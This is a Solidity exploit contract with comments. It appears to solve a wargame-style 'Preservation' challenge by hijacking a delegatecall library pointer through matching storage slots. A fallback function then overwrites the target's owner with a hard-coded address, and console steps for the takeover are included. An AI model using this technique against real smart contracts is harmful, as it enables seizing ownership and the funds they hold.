// SPDX-License-Identifier: GPL-3.0
pragma solidity ^0.8.0;

interface Preservation {
  function setSecondTime(uint _timeStamp) external;

  function setFirstTime(address _timeStamp) external;
 
}

contract PreservationExploit{
    address public slot0;
    address public slot1; // So we allign with the storage on the target contract
    address public owner; // slot of owner is now alligned
    address public targetContract  = address(0xB418f5D8D541909236e20e91aF21Ce1337eeA4F1);

    

    fallback() external{
        owner = address(0x737e11E7A11A01891d2cB1b0A07C59A63dcd657C);
    } 


    //Addresses are stored exactly in the same way as uints (in hexadecimal encoding).
    //Thats why I can take the literal value of this contract's address, convert it to decimal formatting and send it as the uint that will override the 
    //Address timeZone1Library in slot[0]
    //Address of this contract's instance in decimal (use online converter): 926866806617623967872101841046340782625996840173
    //var bnr = web3.utils.toBN("926866806617623967872101841046340782625996840173")  

    //await contract.setFirstTime(bnr) //also works with setSecondTime() obviously
    //await contract.setFirstTime(100) //Any value, as we trigger this contract's fallback function anyways

}